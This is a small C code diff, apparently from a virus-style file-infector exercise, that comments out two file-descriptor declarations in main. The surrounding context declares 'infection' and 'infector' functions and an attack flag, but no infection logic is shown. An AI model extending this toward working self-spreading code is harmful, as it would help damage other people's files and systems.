@@ -66,8 +66,10 @@ extern void infection(int fd);
 extern void infector(char * str);
 
 int main (int argc , char* argv[], char* envp[]){
+  /*
   int input_fd = STDIN;
   int output_fd = STDOUT;
+  */
   int buff_size = 20000;
   char buffer[buff_size];
   int  curr_pos, directory_fd, directory_size, prefix_flag_index = -1, attack_flag_index = -1, i = 1;
